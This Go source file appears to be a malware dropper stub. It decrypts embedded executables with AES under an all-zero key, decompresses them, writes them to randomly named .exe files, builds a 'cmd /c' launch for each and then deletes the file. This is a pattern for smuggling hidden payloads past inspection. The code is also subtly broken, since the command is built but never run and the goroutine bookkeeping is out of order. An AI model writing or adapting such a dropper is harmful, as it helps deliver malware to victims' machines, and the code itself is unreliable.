package main

import (
	"io/ioutil"
	"math/rand"
	"os"
	"os/exec"
	"strconv"
	"sync"

	"github.com/Craumix/mwutil"
)

type exepack struct {
	data []byte
}

var defaultkey []byte

var executables []exepack
var wg sync.WaitGroup

func main() {
	defaultkey = []byte{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}

	loadDynamic()

	for _, exe := range executables {
		go runExepack(exe, "")
		wg.Add(1)
	}

	wg.Wait()
}

func runExepack(pack exepack, path string) {
	defer wg.Done()

	b := pack.data
	var err error
	exepath := path + "/" + strconv.Itoa(rand.Intn(1000000000)) + ".exe"

	b, err = mwutil.AesDecrypt(defaultkey, b)
	mwutil.Logif(err)

	b, err = mwutil.GunzipData(b)
	mwutil.Logif(err)

	err = ioutil.WriteFile(exepath, b, 0777)
	mwutil.Logif(err)

	exec.Command("cmd", "/c", exepath)

	err = os.Remove(exepath)
}
